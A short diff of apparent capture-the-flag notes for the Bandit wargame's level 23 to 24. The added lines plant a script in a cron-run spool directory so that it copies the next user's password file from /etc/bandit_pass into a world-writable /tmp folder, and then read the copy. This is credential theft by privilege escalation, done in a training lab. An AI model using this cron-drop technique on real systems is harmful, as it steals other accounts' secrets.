@@ -4,5 +4,11 @@ cd /etc/cron.d
 ls
 cat cronjob_bandit24
 cat /usr/bin/cronjob_bandit24.sh
-
-cat /tmp/$mytarget
+mkdir /tmp/angry
+cd /tmp/angry
+echo "cat /etc/bandit_pass/bandit24 > /tmp/angry/pass" > dump.sh
+chmod 777 dump.sh
+chmod -R 777 /tmp/angry
+cp dump.sh /var/spool/bandit24/
+// Wait for one minute.
+cat pass
